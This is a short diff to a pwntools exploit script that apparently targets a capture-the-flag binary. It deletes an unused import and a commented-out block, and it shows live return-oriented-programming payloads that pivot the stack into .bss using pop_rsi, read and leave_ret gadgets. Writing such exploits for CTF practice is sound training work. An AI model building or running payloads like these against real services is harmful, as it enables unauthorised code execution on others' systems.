@@ -1,4 +1,3 @@
-from operator import le
 from pwn import *
 
 context.log_level = "debug"
@@ -63,17 +62,6 @@ io.sendline(payload)
 payload = p64(call_main)
 pause()
 io.sendline(payload)
-#
-# new_stack = bss + 0x900
-# payload = b"a" * 32
-# payload += p64(new_stack)
-# payload += p64(pop_rsi) + p64(new_stack+8) + p64(read_plt)
-# payload += p64(leave_ret)
-# pause()
-# io.sendline(payload)
-# payload = p64(call_main)
-# pause()
-# io.sendline(payload)
 
 new_stack = bss + 0x900
 payload = b"a" * 32
